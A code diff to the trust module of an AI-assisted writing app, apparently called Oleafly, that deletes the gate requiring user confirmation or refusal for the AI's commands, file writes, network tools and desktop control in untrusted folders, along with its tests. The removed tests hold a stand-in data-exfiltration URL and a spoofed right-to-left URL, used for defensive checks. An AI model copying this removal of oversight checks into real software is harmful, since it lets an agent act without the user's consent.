@@ -17,24 +17,15 @@ const MAX_GIT_MODULE_DIRS: usize = 64;
 const MAX_NESTED_SCAN_DIRS: usize = 128;
 const MAX_NESTED_SCAN_DEPTH: usize = 5;
 const MAX_GIT_CONFIG_BYTES: u64 = 256 * 1024;
-const RUN_COMMAND_REFUSAL: &str =
-    "Commands are turned off in this folder until the user trusts it in Oleafly.";
-const DESKTOP_APPS_REFUSAL: &str =
-    "Oleafly limits this folder until the user trusts it, so Computer Use is off here.";
-const NETWORK_TOOLS: &[&str] = &[
-    "literature_search",
-    "verify_citation",
-    "list_overleaf_projects",
-    "import_overleaf_projects",
-    "web_search",
-    "web_fetch",
-];
+
+#[cfg(test)]
 const DOCUMENT_EXTENSIONS: &[&str] = &[
     "bbl", "bbx", "bib", "bst", "cbx", "cfg", "cls", "csv", "dat", "def", "dtx", "eps", "gif",
     "ins", "ist", "jpeg", "jpg", "json", "latex", "lbx", "ltx", "markdown", "md", "pdf", "pgf",
     "png", "ps", "qmd", "sty", "svg", "tex", "tikz", "toml", "tsv", "txt", "typ", "webp", "xml",
     "yaml", "yml",
 ];
+#[cfg(test)]
 const EXECUTABLE_CONFIG_NAMES: &[&str] = &[
     "arara.yaml",
     "arara.yml",
@@ -55,11 +46,6 @@ const EXECUTABLE_CONFIG_NAMES: &[&str] = &[
 pub enum Capability {
     Git,
     TerminalAutostart,
-    ExternalAgents,
-    McpExposure,
-    ResearchTasks,
-    RunCommand,
-    FullAccess,
     SystemTex,
     ShellEscape,
     Notebook,
@@ -70,11 +56,6 @@ impl Capability {
         match self {
             Self::Git => "trust.git",
             Self::TerminalAutostart => "trust.terminal",
-            Self::ExternalAgents => "trust.agents",
-            Self::McpExposure => "trust.mcp",
-            Self::ResearchTasks => "trust.research_tasks",
-            Self::RunCommand => "trust.run_command",
-            Self::FullAccess => "trust.full_access",
             Self::SystemTex => "trust.system_tex",
             Self::ShellEscape => "trust.shell_escape",
             Self::Notebook => "trust.notebook",
@@ -102,13 +83,6 @@ impl TrustState {
     }
 }
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum McpExposure {
-    Closed,
-    ReadOnly,
-    Full,
-}
-
 #[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "snake_case")]
 pub enum TrustScope {
@@ -132,64 +106,6 @@ pub struct ProjectTrust {
     pub source: Option<TrustSource>,
     pub parent: Option<String>,
     pub repository: Option<RepositoryTrust>,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub enum AiConfirm {
-    Write(String),
-    Network {
-        tool: String,
-        target: Option<String>,
-    },
-}
-
-const MAX_SHOWN_TARGET: usize = 200;
-
-fn shown_target(arguments: &serde_json::Value) -> Option<String> {
-    let (raw, quoted) = match arguments.get("url").and_then(serde_json::Value::as_str) {
-        Some(url) => (url, false),
-        None => (arguments.get("query")?.as_str()?, true),
-    };
-    let clean: String = raw
-        .chars()
-        .map(|character| {
-            if character.is_control() {
-                ' '
-            } else {
-                character
-            }
-        })
-        .filter(|character| {
-            !matches!(
-                character,
-                '\u{200b}'..='\u{200f}' | '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}' | '\u{feff}'
-            )
-        })
-        .collect();
-    let clean = clean.trim();
-    if clean.is_empty() {
-        return None;
-    }
-    let count = clean.chars().count();
-    let shown = if count > MAX_SHOWN_TARGET {
-        let head: String = clean.chars().take(MAX_SHOWN_TARGET * 3 / 4).collect();
-        let tail: String = clean.chars().skip(count - MAX_SHOWN_TARGET / 4).collect();
-        format!("{head}…{tail}")
-    } else {
-        clean.to_string()
-    };
-    Some(if quoted {
-        format!("\u{201c}{shown}\u{201d}")
-    } else {
-        shown
-    })
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub enum AiToolGate {
-    Allow,
-    Confirm(AiConfirm),
-    Forbid(&'static str),
 }
 
 #[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
@@ -608,14 +524,7 @@ pub fn restrict_compile_meta(
     Ok(meta)
 }
 
-pub fn mcp_exposure(project_id: &str) -> McpExposure {
-    match project_trust(project_id) {
-        Ok(TrustState::Trusted(TrustSource::Library)) => McpExposure::Full,
-        Ok(TrustState::Trusted(_)) => McpExposure::ReadOnly,
-        _ => McpExposure::Closed,
-    }
-}
-
+#[cfg(test)]
 pub fn write_needs_approval(relative_path: &str) -> bool {
     let normalized = relative_path.replace('\\', "/");
     let segments: Vec<&str> = normalized
@@ -635,44 +544,6 @@ pub fn write_needs_approval(relative_path: &str) -> bool {
     match name.rsplit_once('.') {
         Some((stem, extension)) if !stem.is_empty() => !DOCUMENT_EXTENSIONS.contains(&extension),
         _ => true,
-    }
-}
-
-pub fn ai_tool_gate(tool: &str, arguments: &serde_json::Value) -> AiToolGate {
-    let argument = |key: &str| {
-        arguments
-            .get(key)
-            .and_then(serde_json::Value::as_str)
-            .unwrap_or_default()
-            .to_string()
-    };
-    match tool {
-        "run_command" => AiToolGate::Forbid(RUN_COMMAND_REFUSAL),
-        "write_file" | "replace_in_file" | "create_file" | "delete_file" => {
-            let path = argument("path");
-            if write_needs_approval(&path) {
-                AiToolGate::Confirm(AiConfirm::Write(path))
-            } else {
-                AiToolGate::Allow
-            }
-        }
-        "rename_file" => {
-            let from = argument("from");
-            let to = argument("to");
-            if write_needs_approval(&to) {
-                AiToolGate::Confirm(AiConfirm::Write(to))
-            } else if write_needs_approval(&from) {
-                AiToolGate::Confirm(AiConfirm::Write(from))
-            } else {
-                AiToolGate::Allow
-            }
-        }
-        name if NETWORK_TOOLS.contains(&name) => AiToolGate::Confirm(AiConfirm::Network {
-            tool: name.to_string(),
-            target: shown_target(arguments),
-        }),
-        crate::cua_driver::DESKTOP_APPS_TOOL => AiToolGate::Forbid(DESKTOP_APPS_REFUSAL),
-        _ => AiToolGate::Allow,
     }
 }
 
@@ -1142,33 +1013,6 @@ fn grant_message(target: &GrantTarget) -> String {
         GrantTarget::Folder { path, .. } => ("dialog.trustFolder.messageParent", folder_name(path)),
     };
     crate::i18n::t_with(key, &[("name", &name)])
-}
-
-pub async fn confirm_ai_tool<R: tauri::Runtime>(
-    app: tauri::AppHandle<R>,
-    request: AiConfirm,
-) -> Result<bool, String> {
-    let (title, message, confirm) = match &request {
-        AiConfirm::Write(path) => (
-            "dialog.restrictedWrite.title",
-            crate::i18n::t_with("dialog.restrictedWrite.message", &[("path", path)]),
-            "dialog.restrictedWrite.confirm",
-        ),
-        AiConfirm::Network { tool, target } => {
-            let mut message =
-                crate::i18n::t_with("dialog.restrictedNetwork.message", &[("tool", tool)]);
-            if let Some(target) = target {
-                message.push_str("\n\n");
-                message.push_str(target);
-            }
-            (
-                "dialog.restrictedNetwork.title",
-                message,
-                "dialog.restrictedNetwork.confirm",
-            )
-        }
-    };
-    native_confirm(&app, title, message, confirm).await
 }
 
 #[tauri::command]
@@ -1653,87 +1497,6 @@ mod tests {
     }
 
     #[test]
-    fn restricted_ai_tools_are_refused_confirmed_or_allowed() {
-        use serde_json::json;
-        assert_eq!(
-            ai_tool_gate("run_command", &json!({"command": "ls"})),
-            AiToolGate::Forbid(RUN_COMMAND_REFUSAL)
-        );
-        assert_eq!(
-            ai_tool_gate("write_file", &json!({"path": "main.tex"})),
-            AiToolGate::Allow
-        );
-        assert_eq!(
-            ai_tool_gate("replace_in_file", &json!({"path": ".envrc"})),
-            AiToolGate::Confirm(AiConfirm::Write(".envrc".into()))
-        );
-        assert_eq!(
-            ai_tool_gate(
-                "rename_file",
-                &json!({"from": "notes.txt", "to": "Makefile"})
-            ),
-            AiToolGate::Confirm(AiConfirm::Write("Makefile".into()))
-        );
-        assert_eq!(
-            ai_tool_gate("literature_search", &json!({"query": "x"})),
-            AiToolGate::Confirm(AiConfirm::Network {
-                tool: "literature_search".into(),
-                target: Some("\u{201c}x\u{201d}".into()),
-            })
-        );
-        assert_eq!(
-            ai_tool_gate("read_file", &json!({"path": ".envrc"})),
-            AiToolGate::Allow
-        );
-    }
-
-    #[test]
-    fn the_network_prompt_shows_what_the_call_sends() {
-        use serde_json::json;
-        let target = |tool: &str, arguments: serde_json::Value| match ai_tool_gate(tool, &arguments)
-        {
-            AiToolGate::Confirm(AiConfirm::Network { target, .. }) => target,
-            other => panic!("{other:?}"),
-        };
-        assert_eq!(
-            target("web_fetch", json!({"url": "https://evil.example/c?d=abc"})).as_deref(),
-            Some("https://evil.example/c?d=abc")
-        );
-        assert_eq!(
-            target("web_search", json!({"query": "thesis title"})).as_deref(),
-            Some("\u{201c}thesis title\u{201d}")
-        );
-        let long = format!("https://evil.example/c?d={}END", "A".repeat(5_000));
-        let shown = target("web_fetch", json!({ "url": long })).unwrap();
-        assert!(shown.starts_with("https://evil.example/c?d=AAA"), "{shown}");
-        assert!(shown.ends_with("END") && shown.contains('…'), "{shown}");
-        assert!(shown.chars().count() <= MAX_SHOWN_TARGET + 1);
-        let spoofed = target(
-            "web_fetch",
-            json!({"url": "https://ok.example/\n\nAllow is safe\u{202e}txt.exe"}),
-        )
-        .unwrap();
-        assert!(
-            !spoofed.contains('\n') && !spoofed.contains('\u{202e}'),
-            "{spoofed}"
-        );
-        assert_eq!(target("list_overleaf_projects", json!({})), None);
-    }
-
-    #[test]
-    fn restricted_folders_refuse_desktop_apps() {
-        use serde_json::json;
-        assert!(matches!(
-            ai_tool_gate("desktop_apps", &json!({"tool": "list_apps"})),
-            AiToolGate::Forbid(_)
-        ));
-        assert_eq!(
-            ai_tool_gate("desktop_apps", &json!({"tool": "click"})),
-            AiToolGate::Forbid(DESKTOP_APPS_REFUSAL)
-        );
-    }
-
-    #[test]
     fn trust_file_is_private_and_never_overwritten_when_unreadable() {
         let _env_guard = crate::paths::data_dir_env_lock();
         let data = tempfile::tempdir().unwrap();
@@ -2120,7 +1883,6 @@ mod tests {
         )
         .unwrap();
         assert_eq!(typst.engine, "typst");
-        assert_eq!(mcp_exposure("restricted-meta"), McpExposure::Closed);
     }
 
     #[test]
@@ -2195,19 +1957,17 @@ mod tests {
         let (id, _) = fixture.link("papers/thesis");
         assert_eq!(project_trust(&id).unwrap(), TrustState::Restricted);
         assert_eq!(
-            require_trusted(&id, Capability::ExternalAgents)
+            require_trusted(&id, Capability::TerminalAutostart)
                 .unwrap_err()
                 .code,
-            "trust.agents"
+            "trust.terminal"
         );
-        assert_eq!(mcp_exposure(&id), McpExposure::Closed);
         let target = grant_target(&id, TrustScope::Folder).unwrap();
         apply_grant(&id, &target).unwrap();
         assert_eq!(
             project_trust(&id).unwrap(),
             TrustState::Trusted(TrustSource::Folder)
         );
-        assert_eq!(mcp_exposure(&id), McpExposure::ReadOnly);
         assert_eq!(
             describe(&id).unwrap(),
             ProjectTrust {
@@ -2325,7 +2085,6 @@ mod tests {
             "trust.git"
         );
         assert!(git_restriction(&notes, &notes_root).unwrap().is_some());
-        assert_eq!(mcp_exposure(&notes), McpExposure::Closed);
         fixture.trust(&paper, TrustScope::Parent);
         fixture.trust(&paper, TrustScope::Repository);
         assert_eq!(
